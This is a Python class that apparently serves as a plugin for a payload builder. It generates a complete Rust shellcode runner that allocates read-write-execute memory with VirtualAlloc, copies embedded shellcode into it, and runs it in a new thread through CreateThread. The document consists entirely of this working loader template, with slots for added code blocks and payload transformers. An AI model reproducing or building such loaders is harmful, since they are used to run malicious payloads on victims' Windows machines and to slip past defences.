class shellcoderunner:
    def __init__(self, arguments):
        pass

    def imports(self) -> list[str]:
        return ['extern crate windows_sys;', 
                'use windows_sys::Win32::System::Memory::VirtualAlloc;', 
                'use windows_sys::Win32::System::Threading::CreateThread;', 
                'use windows_sys::Win32::System::Threading::WaitForSingleObject;', 
                'use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};',
                'use std::ptr;'
        ]

    def compilerOptions(self) -> list[str]:
        return ['windows-sys = { version = "0.61.2", features = ["Win32_System_Memory", "Win32_System_Threading", "Win32_Security", "Win32_Foundation"] }']

    def template(self, imports, codeblocks, transformers, shellcodeSize) -> str:
        return f"""
{imports}

{codeblocks}

fn main() {{
    
    
    {transformers}
    unsafe {{
        let func_addr = VirtualAlloc(
            ptr::null_mut(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE, 
        );
		
        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), func_addr as *mut u8, shellcode.len());

        let h_thread = CreateThread( 
            ptr::null_mut(), 
            0,
            Some(std::mem::transmute(func_addr)), 
            ptr::null_mut(),
            0,
            ptr::null_mut(), 
        );

        WaitForSingleObject(h_thread, 0xFFFFFFFF); 
    }}
}}
"""